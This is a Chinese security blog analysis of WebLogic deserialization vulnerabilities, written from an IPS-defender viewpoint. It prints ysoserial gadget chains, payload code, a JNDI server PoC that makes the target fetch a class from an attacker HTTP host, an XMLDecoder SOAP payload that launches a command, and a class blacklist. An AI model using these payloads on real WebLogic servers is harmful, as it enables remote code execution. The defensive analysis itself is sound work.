## 一、前言  

**Weblogic反序列化漏洞是一个经典的漏洞系列，根源在于Weblogic（及其他很多java服务器应用）在通信过程中传输数据对象，涉及到序列化和反序列化操作，如果能找到某个类在反序列化过程中能执行某些奇怪的代码，就有可能通过控制这些代码达到RCE的效果。随着每次补丁的修复，很多Weblogic反序列化的思路都被封禁了，但是跟Struts2系列漏洞不同的是，Weblogic漏洞由于涉及的面比较广，所以近几年还是持续有新出漏洞的，这也体现了挖掘出新漏洞的高手们对java语言理解之深。目前在做渗透测试时，Weblogic漏洞主要也是碰碰运气，用来攻击没打补丁的系统会比较有效。**

网上的分析文章主要从攻击利用的角度来分析这些Weblogic漏洞。作为新华三攻防团队，我们的一部分工作是维护ips产品的规则库，今天回顾一下这个系列的漏洞，给大家分享一些防护者的思路，如果有遗漏或者错误，欢迎各位大佬指正。

##  二、Weblogic历史漏洞

Weblogic反序列化漏洞经过了几个阶段，利用技术也有多种变形。从利用方式来看，前期是直接通过t3协议发送恶意反序列化对象，后期利用t3协议配合java
rmp或jndi接口反向发送反序列化数据，以及通过javabean xml方式发送反序列化数据，相应的漏洞点和代码执行用到的辅助类也有比较多的变种。

Serialize是串行化、序列化的意思，串行可以理解在串口线上按bit传递数据，把具有立体结构的数据类型通过串行方式传到对端，涉及到把面向对象大的实例数据类型变成二进制格式发送和接收到二进制格式数据后还原为实例数据类型，这两个操作就是序列化和反序列化。

支持序列化的java类，需要实现Serializable接口，并且可以选择性的实现writeObject/readObject和writeExternal/readExternal函数，这两对函数给予这个类一个机会，即在序列化和反序列化的时候可以进行自定义的操作。反序列化漏洞的原因可以理解为，在某个类被反序列化时，会调用自己的readObject函数，而readObject从数据流中读取数据并进行某些操作，如果数据流中包含了特定的恶意数据，会引发任意代码执行的效果。

###  2.1T3协议利用

 **2.1.1 CVE-2015-4582**

漏洞存在于大家耳熟能详的commons-collections:3.1这个库，其中AnnotationInvocationHandler类的readObject函数会调用map接口的entrySet函数，LazyMap是一种实现了map接口的特殊map，它的特点是如果key不存在，会随即通过实现了Transformer接口的内部对象对key生成一个value，而Tranformer接口有一个特殊的实现类，是InvokeTransformer，即实现了函数调用的特殊Transformer。在漏洞利用时，配置AnnotationInvocationHandler的map为LazyMap，LazyMap的内部Transformer接口为InvokeTransformer，这样AnnotationInvocationHandler的反序列化readObject函数会导致任意函数执行的InvokeTransformer调用。实际的调用链会更复杂一些，如任意函数调用需要链式Transformer即ChainedTransformer，map不是直接的LazyMap，而是用动态代理包裹了另外一个实现了map接口的AnnotationInvocationHandler对象。

Ysoserial的注释写明了调用链，如下：

    
    
    Gadget chain:
        ObjectInputStream.readObject()
           AnnotationInvocationHandler.readObject()  //外层InvocationHandler
              Map(Proxy).entrySet()
                 AnnotationInvocationHandler.invoke() //包裹的内层InvocationHandler
                    LazyMap.get()                 //get方法触发Transformer的执行ChainedTransformer.transform()  // ChainedTransformer执行代码
                          ConstantTransformer.transform()
                          InvokerTransformer.transform()
                             Method.invoke()
                                Class.getMethod()
                          InvokerTransformer.transform()
                             Method.invoke()
                                Runtime.getRuntime()
                          InvokerTransformer.transform()
                             Method.invoke()
                                Runtime.exec()

实际weblogic执行漏洞调用栈如下：  

    
    
    readObject:312, AnnotationInvocationHandler (sun.reflect.annotation)
    
        ………………..
    
        readObject0:1328, ObjectInputStream (java.io)
    
        readObject:350, ObjectInputStream (java.io)
    
        readObject:66, InboundMsgAbbrev (weblogic.rjvm)
    
        read:38, InboundMsgAbbrev (weblogic.rjvm)
    
        readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
    
        init:213, MsgAbbrevInputStream (weblogic.rjvm)
    
        dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
    
        dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
    
        ………………..
    
        run:117, ExecuteThread (weblogic.kernel)

 **2.1.2 CVE-2016-0638**

这个漏洞用weblogic.jms.common.StreamMessageImpl对CVE-2015-4582进行了一次封装，以下是StreamMessageImpl的readExternal函数，

    
    
    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
         super.readExternal(var1);
         byte var2 = var1.readByte();
         byte var3 = (byte)(var2 & 127);
         if (var3 >= 1 && var3 <= 3) {
             switch(var3) {
             case 1:
                 this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
                 BufferInputStream var4 = this.payload.getInputStream();
                 ObjectInputStream var5 = new ObjectInputStream(var4);
                 this.setBodyWritable(true);
                 this.setPropertiesWritable(true);
     
                 try {
                     while(true) {
                         this.writeObject(var5.readObject());
                     }
                 …………………………………
     }

StreamMessageImpl在反序列化的时候，根据传递过来的输入数据第一个字节判断是否是1,若为1，会对后续数据调用反序列化函数，var5实际是一个ObjectInputStream，其readObject即开启了后续反序列化的启动，这个漏洞可以通过组合StreamMessageImpl加上CVE-2015-4582的payload进行触发，二进制payload如下：  

![image.png](https://image.3001.net/images/20200304/15832921659068.png!small)

**2.1.3 CVE-2016-3510**

跟上一个漏洞类似，这次利用的是weblogic.corba.utils.MarshalledObject这个类，这个类并没有实现readObject或者readExternal函数，所以在反序列化的时候采用ObjectInputStream的默认流程。但是默认流程中，会调用辅助类ObjectStreamClass的invokeReadResolve函数，后者会调用MarshalledObject的回调函数readResolve，而readResolve会调用readObject开启反序列化流程，反序列化的字节流来自其本身的objBytes变量，如下：

    
    
    private byte[] objBytes = null;

所以在构造MarshalledObject时把生成的恶意payload Object作为参数传给构造函数即可。漏洞触发时情况如下：

![image.png](https://image.3001.net/images/20200304/15832921913270.png!small)

调用栈：

    
    
    readResolve:58, MarshalledObject (weblogic.corba.utils)
    
        invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    
        invoke:39, NativeMethodAccessorImpl (sun.reflect)
    
        invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
    
        invoke:597, Method (java.lang.reflect)
    
        invokeReadResolve:1061, ObjectStreamClass (java.io)
    
        readOrdinaryObject:1761, ObjectInputStream (java.io)
    
        readObject0:1328, ObjectInputStream (java.io)
    
        readObject:350, ObjectInputStream (java.io)
    
        readObject:66, InboundMsgAbbrev (weblogic.rjvm)
    
        .............

###  2.2T3 + JRMP协议利用

由于补丁的修复，直接触发漏洞利用就比较困难了，17年之后的漏洞开始通过构造JRMP服务器监听的方法反向触发。JRMP是RMI(远程方法调用)的底层实现协议，具体利用点比较单一，都用到分布式垃圾回收相关的代码(DGC,Distributed
garbage collection)，由于涉及到太多模块（RMI+DGC），只能讲讲我粗浅的理解。

 **2.2.1 CVE-2017-3248**

几个T3+JRMP漏洞比较接近，第一个漏洞CVE-2017-3248，触发漏洞时发送的请求包是JRMPClient，即大家常用脚本里面配置的红框参数

![image.png](https://image.3001.net/images/20200304/1583292224629.png!small)

ysoseral的JRMPClient这个类有一段注释，如下

    
    
    * UnicastRef.newCall(RemoteObject, Operation[], int, long)
     * DGCImpl_Stub.dirty(ObjID[], long, Lease)
     * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
     * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
     * DGCClient.registerRefs(Endpoint, List<LiveRef>)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *
     * Thread.start()
     * DGCClient$EndpointEntry.<init>(Endpoint)
     * DGCClient$EndpointEntry.lookup(Endpoint)
     * DGCClient.registerRefs(Endpoint, List<LiveRef>)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *

通过发送实现了UnicastRef的实例，可以让被攻击的weblogic，向攻击者控制的远程监听的服务器发起DGC请求，这个DGC请求实际是一个远程方法调用，调用完成之后会返回某个类的实例作为结果给weblogic，
weblogic收到数据之后会进行反序列化，从而触发RCE流程。

首先T3协议发送UnicastRef对象，调用的是ysoserial的payload目录下JRMPClient类getObject方法生成恶意序列化对象

    
    
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry  
     TCPEndpoint te = new TCPEndpoint(host, port);  
     UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
     RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
     Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {  
         Registry.class  
     }, obj);  
     return proxy;

实际payload使用的是RemoteObjectInvocationHandler封装了UnicastRef对象，触发时调用栈如下：

![image.png](https://image.3001.net/images/20200304/15832922454228.png!small)随后weblogic会向攻击者控制的远程监听的服务器发起名为Dirty的DGC请求，这是一个远程方法调用（RMI），调用结果会被weblogic进行反序列化生成对象，攻击者控制的恶意服务器并不执行垃圾回收操作，而是返回能进行代码执行的Object
payload给weblogic。下图为执行RCE时情形

![image.png](https://image.3001.net/images/20200304/15832922574890.png!small)因此设备端JRMP的漏洞检测，除了可以检测第一个T3回话包，也可以同时检测JRMP服务器返回的恶意Object对象，如下报文蓝色部分显示的负载。

![image.png](https://image.3001.net/images/20200304/15832922709945.png!small)

**2.2.2 CVE-2018-2628**

这个CVE是对上一个漏洞的绕过，脚本命令python2 44553.py 192.168.140.22 7001
ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.120.3 1099
JRMPClient换成了其他payload如JRMPClient2，或者JRMPClient3。

JRMPClient2的payload，把接口由registry改成了Activator：

    
    
    Object object = Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] { Activator.class }, remoteObjectInvocationHandler);

JRMPClient3的payload，用streamMessageImpl对remoteObjectInvocationHandler做一次封装：

    
    
    Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
    
        return streamMessageImpl(Serializer.serialize(object));

实际干活的是UnicastRef，所以直接用UnicasRef当payload也可以测试成功（我是那最初的Weblogci测试的，没有验证在CVE-2017-3248补丁的情况下是否可行，理论上这个漏洞是在CVE-2018-2628之后而完全修复的，因此直接打UnicastRef的payload应该也可行）

![image.png](https://image.3001.net/images/20200304/15832923081379.png!small)

**2.2.3 CVE-2018-2693**

这个漏洞是应该是对调用链的绕过，以前执行代码用的是InvokerTransformer +
AnnotationInvocationHandler的组合，后来调用链被挖掘出几种变形InstantiateTransformer +
AnnotationInvocationHandler，InvokerTransformer +
BadAttributeValueExpException可以分别参考ysoserial的CommonsCollections3和CommonsCollections5两个类。

后来应该是Apache修复了commons
collections，又有高手挖掘出利用JDK的类来执行代码，代码在ysoserial里面JDK7u21这个类，要求是weblogic使用JDK7并且版本在7u21以下，所以先看这个Payload，JDK7u21的Payload如下（缩减了一下，保留了关键行）

    
    
    final Object templates = Gadgets.createTemplatesImpl(command);
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");
        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);
        map.put(zeroHashCodeStr, templates); // swap in real object

主要用到了两个类TemplatesImpl +
AnnonationInvocationHandler。TemplatesImpl对象本身包含了字节码bytecode变量，用于生成AbstractTranslet的实现类，因此包含有动态性，然后用javassist库修改这个实现类的字节码，在构造函数末尾插入代码执行的指令。AnnonationInvocationHandler本身是用来代理实现注释类的，通过反射方式修改了该类实例的type变量，将其标记为Templates接口，最后生成Proxy打包好。

构造完成之后，将Proxy和TempleteImp实例放到一个LinkedHashSet里面，反序列化的时候，是从这个Set中先反序列化出TempleteImp实例，解释反序列化Proxy实例，不过由于是集合结构，对比此Proxy实例在链表中是否存在，因此调用该对象的equals函数，即Proxy.equals()函数，

![image.png](https://image.3001.net/images/20200304/15832923341357.png!small)
转发给内层的AnnonationInvocationHandler，equals是Object类型自带的函数，AnnonationInvocationHandler进行了重载，然后下发到实际进行判断的equalsImpl函数，

![image.png](https://image.3001.net/images/20200304/15832923476151.png!small)

getMemberMethods从AnnonationInvocationHandler的type对象中提取声明的方法，然而这个type已经被换成了Templates.class，这个接口声明了2个方法，第一个是getOutputProperties，跳过判断后会调用此方法，而此方法又会逐层调用newTransformer
à getTransletInstance à
defineTransletClasses，最后defineTransletClasses用TempleteImp内部的字节码bytecode生成一个class，随后调用其构造函数生成AbstractTranslet实现类的实例。  

![image.png](https://image.3001.net/images/20200304/15832923602875.png!small)

这个实现类的类名在Gadget模块里面随机生成，其构造函数已经被插入了代码执行的语句，最终达到RCE的效果。  

![image.png](https://image.3001.net/images/20200304/15832923758207.png!small)反序列化时的调用栈如下：  

    
    
    defineTransletClasses:306, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    
        getTransletInstance:364, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    
        newTransformer:398, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    
        getOutputProperties:419, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    
        ........
    
        equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)
    
        invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)
    
        equals:-1, $Proxy0 (com.sun.proxy)
    
        put:475, HashMap (java.util)
    
        readObject:309, HashSet (java.util)

这个调用链的构造体现了作者对Java理解非常之深，每个细节都非常精巧。值得说的是，这种利用应该只针对JDK1.7版本，所以使用了JDK1.6的Weblogic10版本应该无法利用。

回到CVE-2018-2693，公开的poc在JRMP监听服务器用的就是JDK7u21的payload，触发漏洞的请求则是用streamMessageImpl重新包装一次remoteObjectInvocationHandler，也就是JRMPClient4的Payload，如下：

    
    
    Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Activator.class }, remoteObjectInvocationHandler);
    
        return streamMessageImpl(Serializer.serialize(object));

 **2.2.4 CVE-2018-3245**

这个漏洞并没有验证，不过看到以前公开的poc，似乎也是对UnicastRef的一个封装，这次用的是ReferenceWrapper_Stub这个类来打包，如图：

![image.png](https://image.3001.net/images/20200304/15832924133338.png!small)

**2.2.5 CVE-2018-3191**  

这个漏洞似乎既可以用T3 + JRMP协议（发送恶意实例）利用，也可以用T3 +
JNDI接口协议（发送恶意的类进行加载）利用。漏洞点在JtaTransactionManager这个类，它实现了serialize接口，有自己的readObject函数，readObject会逐层调用到context.lookup函数，查询攻击者可控的JNDI接口地址。

![image.png](https://image.3001.net/images/20200304/15832924327436.png!small)

weblogic反序列化JtaTransactionManager时，lookup查询JNDI的注册表其实也是一个RMI的过程，这样还是可以利用之前T3 +
JRMP协议的方式来发送恶意实例数据来执行任意代码。但是可以看看JDNI接口注入的方式，这种方式比较有意思，github上的POC如下:

    
    
    public class JNDIServer {  
       
         public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {  
             Registry registry = LocateRegistry.createRegistry(1099);  
              String RhttpHost = args[0];  
             Reference reference = new Reference("LoadObject",  
                     "LoadObject","http://"+RhttpHost+"/");  
             ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);registry.bind("LoadObject",referenceWrapper);  
       
         }  
     }

rmi协议的注册表将LoadObject绑定到了一个http服务器的URL上，weblogic请求查询rmi://xxxx:1099/LoadObject的时候，会从http服务器的URL地址上下载这个类，并且通过配置的工厂类来新建一个工厂类实例，这个工厂类是攻击者准备的恶意class文件，在构造函数里面可以编写任意代码让weblogic执行。

![image.png](https://image.3001.net/images/20200304/15832924572495.png!small)调用栈：

    
    
    getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
    
        getObjectInstance:302, NamingManager (javax.naming.spi)
    
        decodeObject:439, RegistryContext (com.sun.jndi.rmi.registry)
    
        lookup:103, RegistryContext (com.sun.jndi.rmi.registry)
    
        lookup:185, GenericURLContext (com.sun.jndi.toolkit.url)
    
        lookup:392, InitialContext (javax.naming)
    
        .............................
    
        lookup:155, JndiTemplate (com.bea.core.repackaged.springframework.jndi)
    
        lookupUserTransaction:565, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    
        initUserTransactionAndTransactionManager:444, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    
        readObject:1198, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    
        ...........................
    
        readObject:66, InboundMsgAbbrev (weblogic.rjvm)

攻击时从远端http服务器加载class文件,(192.168.140.22是被攻击的weblogic服务器，其主动加载LoadObject类)

![image.png](https://image.3001.net/images/20200304/15832924793711.png!small)

###  2.3HTTP + XML协议利用

跟JRMP同步出现的是利用Javabean对象的反序列化，用的是xmldecoder类进行反序列化。直接发Post
HTTP请求就可以执行代码，被广泛应用于挖矿病毒的自动化传播。

 **2.3.1 CVE-2017-3506**

漏洞模块是/wls-wsat/CoordinatorPortType，在收到XML格式的Javabean实例数据时，有机会调用函数来创建此对象，而这个调用函数的机会就会被攻击者用来执行任意代码，github上的poc如下：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    
           <soapenv:Header>
    
                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    
                              <java version="1.8.0_151" class="java.beans.XMLDecoder">
    
                              <object class="java.lang.ProcessBuilder">
    
                                       <array class="java.lang.String" length="3">
    
                                       <void index = "0">
    
                                                <string>cmd</string>
    
                                       </void>
    
                                       <void index = "1">
    
                                                <string>/c</string>
    
                                       </void>
    
                                       <void index = "2">
    
                                                <string>calc</string>
    
                                       </void>
    
                              </array>
    
                              <void method="start"/>
    
                              </object>
    
                              </java>
    
                              </work:WorkContext>
    
           </soapenv:Header>
    
        <soapenv:Body/>
    
        </soapenv:Envelope>

主要的处理流程也是XMLDecoder在进行标签的解析和函数调用，漏洞触发时调用栈如下：

    
    
    readObject:201, XMLDecoder (java.beans)
    
        readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
    
        readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
    
        receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
    
        receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
    
        receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    
        readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
    
        processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    
        ....................

在解析<object
class="java.lang.ProcessBuilder">标签是会调用ProcessBuilder的构造函数生成一个实例，参数就是子标签的String类型数组。

 **2.3.2 CVE-2017-10271**

这个漏洞是对上个CVE(CVE-2017-3506)补丁修复的绕过，主要利用了void标签替换object标签绕过补丁

 **2.3.3 CVE-2019-2725**

这个漏洞又是对CVE(CVE-2017-10271)补丁修复的绕过，并且发现了新的XML处理模块wls9-async。这次绕过用到UnitOfWorkChangeSet自身构造函数的反序列化调用过程。

![image.png](https://image.3001.net/images/20200304/15832925551344.png!small)

##  三、网络侧Weblogic漏洞攻击的防护思路

对于T3协议的漏洞利用，weblogic主要是通过对InputStream设置一些黑名单类和包进行过滤：

    
    
    private static final String[] DEFAULT_BLACKLIST_PACKAGES = {
    
              "org.apache.commons.collections.functors", "com.sun.org.apache.xalan.internal.xsltc.trax", "javassist", "java.rmi.activation", "sun.rmi.server", "org.jboss.interceptor.builder", "org.jboss.interceptor.reader", "org.jboss.interceptor.proxy", "org.jboss.interceptor.spi.metadata", "org.jboss.interceptor.spi.model", "com.bea.core.repackaged.springframework.aop.aspectj", "com.bea.core.repackaged.springframework.aop.aspectj.annotation", "com.bea.core.repackaged.springframework.aop.aspectj.autoproxy", "com.bea.core.repackaged.springframework.beans.factory.support", "org.python.core" };
    
        private static final String[] DEFAULT_BLACKLIST_CLASSES = { "org.codehaus.groovy.runtime.ConvertedClosure", "org.codehaus.groovy.runtime.ConversionHandler", "org.codehaus.groovy.runtime.MethodClosure", "org.springframework.transaction.support.AbstractPlatformTransactionManager", "java.rmi.server.UnicastRemoteObject", "java.rmi.server.RemoteObjectInvocationHandler", "com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager", "java.rmi.server.RemoteObject" };

对于HTTP协议的利用，主要是在代码中进行标签的过滤。

网络侧的ips，waf等安全产品防护Weblogic漏洞攻击，对于利用T3协议的攻击，可以先检测会话属于T3协议，然后加入这些类名可以作为特征进一步验证，如果明确客户网络完全不使用T3协议，由于存在新的0day分享和变形绕过，建议直接对T3协议的流量进行阻断。对于利用HTTP协议的攻击，可以检测URL，毕竟HTTP利用的这两个模块（_async和wls-wsat）实际的WEB服务器很少会用到，也可以考虑直接配置阻断策略。

## 四、总结

目前来看Weblogic官方对反序列化漏洞还是基于黑名单和逐点修复，应该后续还会有高手研究和挖掘出新的0day，所以相比Struts2危害还是要大一些的。现网流量看到的大部分自动扫描器基本也是基于HTTP协议的，毕竟不需要公网ip监听☺。我们review
Weblogic的历史漏洞是为了让防护规则做得更好，由于水平有限，欢迎大家指出文中的错误和交流指教。

参考资料：

> <http://xxlegend.com>
>
> <https://xz.aliyun.com/t/2649>
>
> <https://paper.seebug.org/909/>

一并感谢参考过的其他技术分享博客

***本文作者：新华三攻防团队，转载请注明来自FreeBuf.COM**

